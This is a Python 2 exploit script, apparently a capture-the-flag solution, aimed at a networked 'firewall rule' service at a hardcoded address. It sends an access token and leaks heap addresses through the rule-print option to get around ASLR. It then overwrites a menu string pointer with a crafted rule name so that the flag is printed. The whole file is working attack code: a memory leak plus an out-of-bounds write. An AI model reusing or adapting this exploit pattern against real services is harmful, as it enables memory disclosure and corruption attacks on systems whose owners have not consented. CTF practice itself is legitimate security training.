import sys
import time
import socket
import struct
import binascii
import telnetlib

#--------------------------------------------------------
# Utils
#--------------------------------------------------------

def readuntil(s, chkStr):
    chkLen = len(chkStr)
    data = s.recv(chkLen)
    while True :
        if data[-1] == chkStr[-1] and data[-chkLen:] == chkStr:
            break
        data += s.recv(1)
    return data

#--------------------------------------------------------
# Service Details
#--------------------------------------------------------

target_ip   = "216.165.2.37"
target_port = 4141

#--------------------------------------------------------
# Exploit
#--------------------------------------------------------

# connect to service
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((target_ip, target_port))

# send magic token to pass the firewall prompt
readuntil(s, "ENTER SERVICE ACCESS TOKEN: ")
s.send("352762356\n")

#
# add a rule
#

readuntil(s, "MENU SELECTION: ")
s.send("1\n")

# arbitrary rule name
readuntil(s, "RULE NAME: ")
s.send("B"*4 + "\n")

# arbitrary rule port
readuntil(s, "RULE PORT: ")
s.send("1094795585" + "\n") # 0x41414141

# arbitrary rule type
readuntil(s, "RULE TYPE: ")
s.send("TCP\n")

# end of rule add
readuntil(s, "PRESS ENTER TO RETURN TO MENU")
s.send("\n")

#
# print / leak rule '0'
#

readuntil(s, "MENU SELECTION: ")
s.send("4\n")

# pick rule 0
readuntil(s, "NUMBER TO PRINT: ")
s.send("0\n")

# read leaked addresses
readuntil(s, "Name: ")
byte_leak = s.recv(28)[3:27]

# unpack byte leak into integer addresses
leak = [struct.unpack("<I", byte_leak[i*4:(i+1)*4])[0] for i in xrange(24/4)]

# sanity check the leak (it can fail depending on ASLR!!)
if leak[1] - leak[0] != 0x1C:
    print "[-] leak failed"
    sys.exit()

# compute the address of the flag in memory
flag_offset  = 0x39C9#0x49C9
flag_address = leak[0] + flag_offset
print "[+] leak 0x%X" % leak[0]
print "[+] flag_address: 0x%X" % flag_address

# end of rule edit
readuntil(s, "PRESS ENTER TO RETURN TO MENU")
s.send("\n");

#
# edit a rule
#

readuntil(s, "MENU SELECTION: ")
s.send("2\n")

# pick rule 0
readuntil(s, "NUMBER TO EDIT: ")
s.send("0\n")

# overwrite menu table string
readuntil(s, "RULE NAME: ")
malicious_name  = ""
malicious_name += struct.pack("L", leak[0]-0x1C)[1:]
malicious_name += struct.pack("L", flag_address)
malicious_name += "\x00"*(20-len(malicious_name))
s.send(malicious_name + "\n")

# 'malicious' rule port
readuntil(s, "RULE PORT: ")
s.send("1094795585" + "\n") # 0x41414141

# an arbitrary rule type
readuntil(s, "RULE TYPE: ")
s.send("UDP\n")

# end of rule edit
readuntil(s, "PRESS ENTER TO RETURN TO MENU")
time.sleep(1)
s.send("\n");

#
# scrape flag from menu
#

readuntil(s, "| (null)\n| ")
flag = readuntil(s, "\n")
s.close()

print "Got flag:", flag
